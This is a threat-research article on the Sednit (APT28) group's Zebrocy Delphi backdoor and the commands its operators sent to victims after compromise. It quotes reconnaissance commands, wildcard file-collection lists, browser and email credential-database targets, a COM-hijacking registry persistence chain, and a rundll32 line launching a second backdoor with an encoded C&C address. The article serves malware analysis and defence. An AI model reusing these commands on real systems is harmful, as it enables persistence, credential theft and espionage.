It’s a\ndifficult question that is not possible to answer entirely by reverse engineering the code. In this article\nwe will analyze commands sent by the operator to their targets.\n\n\n-----\n\nThe Sednit group – also known as APT28, Fancy Bear, Sofacy or STRONTIUM – has been operating\nsince at least 2004 and has made headlines frequently in past years.\n\n[Recently, we unveiled the existence of a UEFI rootkit, called LoJax, which we attribute to the Sednit](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/)\ngroup. This is a first for an APT group, and shows Sednit has access to very sophisticated tools to\nconduct its espionage operations.\n\nThree years ago, the Sednit group unleashed new components targeting victims in various countries\nin the Middle East and Central Asia. Since then, the number and diversity of components has\nincreased drastically. [ESET](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/) [researchers and colleagues from other](https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/) [companies have documented](https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/)\nthese components; however, in this article we will focus on what’s beyond the compromise, what the\noperators do once a victim system is running a Zebrocy Delphi backdoor.\n\n## The bear’s bait\n\nAt the end of August 2018, the Sednit group launched a spearphishing email campaign where it\ndistributed shortened URLs that delivered the first stage of Zebrocy components. In the past, Sednit\n[used a similar technique for credential phishing. However, it is unusual for the group to use this](https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf)\ntechnique to deliver one of its malware components directly. Previously, it had used exploits to deliver\nand execute the first stage malware, while in this campaign the group relied entirely on social\nengineering to lure victims into running the first part of the chain. The screenshot in Figure 1 shows\nBitly statistics for the shortened URL used in this campaign.\n\n_Figure 1. Statistics of the Bitly URL_\n\nAbout 20 clicks were recorded on this link in the same week that the URL was created, and these\npresumably downloaded the target archive. Let’s keep in mind that this may mean fewer than 20\npotential victims, as victims may have clicked on the URL twice, or maybe even more times, because\nthe outcome was not what they expected… as we will describe below.\n\nWhile ESET telemetry data indicates that this URL was delivered by spearphishing emails, we don’t\nhave a sample of such an email. The shortened URL leads the victim to an IP-address-based URL,\nwhere the archived payload is located.\n\n\n-----\n\nUnfortunately, without the email message, we don t know if there are any instructions for the user, if\nthere is any further social engineering, or if it relies solely on the victim’s curiosity. The archive\ncontains two files; the first is an executable file, while the second is a decoy PDF document.\n\n_Figure 2. Files extracted from the archive (Google Translate suggests “CATALOGUE – (2018).exe” and “Order_\n\n_97.pdf” from the Ukrainian)_\n\nNote there is a typo in the executable’s filename; it should be “ДОВIДНИК” instead of “ДОВIДНIК”.\nOnce the binary is executed, a password prompt dialog box opens. The result of the password\nvalidation will always be wrong, but after the apparent validation attempt, the decoy PDF document is\nopened. That document appears to be empty, but the downloader, which is written in Delphi, continues\nrunning in the background. The IP address is also used in the URL hardcoded into the first binary\ndownloader.\n\n## The bear’s lair\n\nThe Stage-1 downloader will download and execute a new downloader, written in C++, not so different\nfrom other Zebrocy downloaders. Once again this downloader is as straightforward as the Zebrocy\ngang’s other downloaders. It creates an ID and it downloads a new, interesting backdoor, (this time)\nwritten in Delphi.\n\n[As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is](https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/)\nstored in in the resource section and is split into four different hex-encoded, encrypted blobs. These\nblobs contain the different parts of the configuration.\n\n\n-----\n\n_Figure 3 Overview of the resource section_\n\n\n-----\n\nOnce the backdoor sends basic information about its newly compromised system, the operators take\ncontrol of the backdoor and start to send commands right away.\n\nHence, the time between the victim running the downloader and the operators’ first commands is only\na few minutes.\n\n## How the bear hunts\n\nIn this section we describe in more detail the commands performed manually by the operators through\ntheir Delphi backdoor.\n\nThe commands available are located in one of the configuration blobs mentioned earlier (the\n“commands” blob in Figure 3). The number of supported commands has increased over time, with the\nlatest version of the backdoor having more than thirty. As we did not identify a pattern in the order\nwhich the commands are invoked, we believe the operators are executing them manually.\n\nThe first set of commands gathers information about the victim’s computer and environment:\n\n**Commands** **Arguments**\n\n**SCREENSHOT** **None**\n\n**SYS_INFO** **None**\n\n**GET_NETWORK** **None**\n\n**SCAN_ALL** **None**\n\nThe commands above are commonly executed when the operators first connect to a newly activated\nbackdoor. They don’t have any arguments, and they are quite self-explanatory. Other commands\ncommonly seen executed shortly after these backdoors are activated, listed below:\n\n**Commands** **Arguments**\n\n**REG_GET_KEYS_VALUES** HKEY_CURRENT_USER\n\nSoftware\\Microsoft\\Windows\\CurrentVersion\n\n**DOWNLOAD_DAY(30)**\n\nc:\\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg;*.jpeg;\n\n*.bmp;*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;*.lhz;\n\nd:\\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg;*.jpeg;\n\n*.bmp;*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;*.lhz;\n\n**DOWNLOAD_DAY(1)**\n\nc:\\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg*.jpeg\n*.bmp*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;\n\nd:\\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg*.jpeg\n\n*.bmp*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;\n\n\n-----\n\n**Commands** **Arguments**\n\n**CMD_EXECUTE** echo %APPDATA%\n\nipconfig /all\n\nnetstat -aon\n\n**CMD_EXECUTE** wmic process get Caption,ExecutablePath\n\nreg query\n\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n\nThose who already have read our previous articles about Zebrocy will notice that more or less the\nsame kind of information is sent, over and over again by previous stages. This information is\nrequested within a few minutes of initial compromise and the amount of data the operator will have to\ndeal with is quite considerable.\n\nIn order to collect even more information, from time to time the Zebrocy operators upload and use\ndumpers on victims’ machines. The current dumpers have some similarities with those previously used\nby the group. In this case, Yandex Browser, Chromium, 7Star Browser (a Chromium-based browser),\nand CentBrowser are targeted, as well as versions of Microsoft Outlook from 1997 through 2016:\n\n**Command** **Arguments**\n\n**UPLOAD_AND_EXECUTE_FILE** C:\\ProgramData\\Office\\MS\\msoffice.exe\n\n[…]\n\n4D5A9000…\n\nThese dumpers create log files indicating the presence or absence of potential databases to dump:\n\n**Command** **Arguments**\n\n**DOWNLOAD_LIST** C:\\ProgramData\\Office\\MS\\out.txt\n\nC:\\ProgramData\\Office\\MS\\text.txt\n\nThe current dumper contains the following output when there are no databases to dump:\n\n%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data not found\n\n%LOCALAPPDATA%\\Chromium\\User Data\\Default\\Login Data not found\n\n%LOCALAPPDATA%\\7Star\\7Star\\User Data\\Default\\Login Data not found\n\n%LOCALAPPDATA%\\CentBrowser\\User Data\\Default\\Login Data not found\n\nThese dumpers are quickly removed once they have done their job. Moreover, the backdoor contains\na list of filenames related to credentials from software listed below (database names):\n\nkey3.db Firefox private keys (now named key4.db)\n\ncert8.db Firefox certificate database\n\nlogins.json Firefox encrypted password database\n\naccount.cfn The Bat! (email client) account credentials\n\nwand.dat Opera password database\n\n\n-----\n\nThe operators take care of retrieving these databases if they are present on the victim s computer.\n\n**Command** **Arguments**\n\n\n**DOWNLOAD_LIST**\n\n\n%APPDATA%\\The Bat!\\Account.CFN\n%APPDATA%\\The Bat!\\[REDACTED]\\Account.CFN\n\n\nThe operators retrieve these files on the machine using the DOWNLOAD_LIST command. This\ncommand can be used when the operators are aware of the presence of interesting files on the\ncomputer.\n\nFinally, depending on how interesting the victim is, they malware operators may deploy another\ncustom backdoor. This backdoor is executed using the CMD_EXECUTE command:\n\n**Command** **Arguments**\n\n**CMD_EXECUTE**\n\n\n1\n\n2\n\n3\n\n\nreg add \"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F4-95713A95A62C36A1}\" /ve /d \"Reliability Maintenance Control Panel\" /reg:64\n/f&&reg add \"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F49571-3A95A62C36A1}\\InProcServer32\" /ve /d\n\"%APPDATA%\\Microsoft\\WinSupport\\RMC\\mtrcpl.dll\" /reg:64 /f&&reg add\n\"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F4-95713A95A62C36A1}\\InProcServer32\" /v \"ThreadingModel\" /t REG_SZ /d\n\"Both\" /reg:64 /f\n\nrundll32.exe \"%APPDATA%\\Microsoft\\WinSupport\\RMC\\mtrcpl.dll\",#1\n687474703A2F2F[REDACTED]\n\ndir /s /b /o:gn %APPDATA%\\Microsoft\\\n\n\nThere are some interesting facts here. First, they use COM object hijacking to make the malware\npersistent on the system even though the custom backdoor is installed only for a few hours. Second,\nthe hex-encoded string is the C&C used by the custom backdoor while in the Delphi backdoor the\nC&C is embedded in the configuration.\n\nThe two Delphi backdoors, the common one and the one above, are quite similar but contain these\ninteresting tweaks:\n\n**Delphi backdoor** **Downloaded Delphi backdoor**\n\n**Delphi compiler version** 14.0-15.0 32.0\n\n**32/64-bit** 32-bit 64-bit\n\n**Configuration location** resource section no config (C&C is passed as an argument)\n\n**Number of commands** 5 3\n\n**Encryption algorithm** AES ECB custom\n\n\n-----\n\n**Delphi backdoor** **Downloaded Delphi backdoor**\n\n**Lifetime on the computer** a few days a few hours\n\nOnce again, it’s not very clear what the purpose of this custom backdoor is. The detection ratio is\ndefinitely lower in comparison to the “usual” backdoor. The very short timeframe where this backdoor\nis on the system and operating makes it harder to retrieve. Once its operators complete their evil\ndeeds, they quickly remove it.\n\n## Summary\n\nObserving commands used in the wild by the operator is quite interesting. They are gathering a\nconsiderable amount of information on the compromised target and they are not worried about\nduplicated data. It shows a large gap between the development strategy and what operators do in\npractice. Backdoors with custom configuration and modules are deployed very carefully, which\nindicates some precautions to avoid ending up in the hands of researchers.\n\nThe first set of commands is the same and executed during a very short timeframe, which raises\nanother question: is it automated?\n\n## Indicators of Compromise (IoCs)\n\n**Distribution URL**\n\nhttp://45.124.132[.]127/DOVIDNIK -
